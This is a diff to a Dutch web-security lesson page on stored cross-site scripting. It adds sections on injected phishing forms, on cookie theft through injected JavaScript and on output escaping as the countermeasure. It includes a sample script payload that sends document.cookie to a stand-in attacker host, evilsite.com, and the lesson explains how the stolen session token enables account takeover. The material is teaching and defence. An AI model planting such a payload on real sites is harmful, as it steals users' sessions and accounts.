@@ -49,7 +49,33 @@ figcaption {
 
       <p>Een andere manier om jouw scriptjes te laten draaien in andermans pagina is via de database. Stel er is een site met een invoerveld waar een gebruiker wat kan invullen dat wordt opgeslagen in een database (denk aan: forumposts, comments, wiki's). En stel die informatie wordt later weer aan gebruikers getoond (niet zo'n heel hypothetisch geval, dit beschrijft zo'n 90% van alle websites). Als de site niet goed beveiligd is kan je in de database &lt;script&gt; tags met Javascript opslaan die vervolgens in de browsers van andere gebruikers kan laten runnen.</p>
 
-      <p>Zo'n aanval is vaak veel schadelijker omdat gebruikers dan niet naar een specifieke URL hoeven te gaan om de code uit te laten voeren, maar met alleen maar 'normaal' de site te gebruiken al de klos zijn</p>
+      <p>Zo'n aanval is vaak veel schadelijker omdat gebruikers dan niet naar een specifieke URL hoeven te gaan om de code uit te laten voeren, met alleen maar 'normaal' de site te gebruiken zijn ze al de klos.</p>
+
+      <h3>Aanvallen</h3>
+
+      <h4>HTML toevoegen</h4>
+
+      <p>Als je HTML toe kan voegen kan je gebruikers pagina's laten zien die eigenlijk helemaal niet bestaan. Denk bijvoorbeeld aan een &lt;form&gt; die gebruikers vraagt om persoonlijke details en wachtwoorden. Dit formulier post dan uiteraard naar de site van de aanvaller zodat deze de gegevens weer kan gebruiken voor zijn eigen doeleinden.</p>
+
+      <h4>Javascript toevoegen</h4>
+
+      <p>Gevaarlijker is als het mogelijk is Javascript toe te voegen. Vaak doe je dit door een simpele &lt;script&gt; tag toe te voegen aan de HTML waar je je Javascript in zet. Met Javascript is het mogelijk om cookies en localstorage van de gebruiker te stelen. Stel bijvoorbeeld eens dat we onderstaande HTML toevoegen aan een pagina:</p>
+
+      <p><code>&lt;script&gt;document.location.href='http://evilsite.com/?cookie='+document.cookie;&lt;/script&gt;</code></p>
+
+      <p>Zodra de gebruiker de pagina laad wordt bovenstaande Javascript uitgevoerd. De browser gaat dan automatisch naar de site van de aanvaller. Met de informatie uit zijn cookie. En omdat in de cookie vaak een sessiontoken staat kan de aanvaller deze cookie gebruiken om de gebruiker na te doen en zijn account over te nemen.</p>
+
+      <h3>Countermeasures</h3>
+
+      <p>De belangrijkste regel bij websecurity is: <b>vertrouw nooit input van gebruikers</b>. Ga er van uit dat ze alle mogelijke invoer hebben gevuld met zoveel mogelijk rare tekens in de hoop dat ze iets voorbij jouw filters krijgen. De oplossing voor dit probleem is dan ook om alle invoer die je weer weergeeft op de pagina te <b>escapen</b>.</p>
+
+      <p>In HTML kan je dat doen door alle speciale tekens te vervangen door hun HTML entities. <code>&quot;</code> wordt dan bijvoorbeeld <code>&amp;quot;</code> en <code>&lt;</code> door <code>&amp;lt;</code>, deze entities worden altijd letterlijk weergegeven door de browser en worden nooit als nieuwe tags en attributen gezien.</p>
+
+      <p>Let op dat het uitmaakt waar in de HTML je de invoer van de gebruiker plaatst. Stel dat je de site zo geprogrammeerd hebt:</p>
+
+      <p><code>&lt;script&gt;<b>{{ gebruikersinvoer hier }}</b>&lt;/script&gt;</p></code>
+
+      <p>Dan heeft geen enkele escape actie zin meer, het is dan bijna altijd mogelijk om Javascript op je site uit te voeren. Het zal je verbazen hoeveel sites bijna letterlijk bovenstaande code in zich hebben om 'handig' Javascript variabelen op een bepaalde waarde te zetten.</p>
 
       <h1>Opdrachten</h1>
 
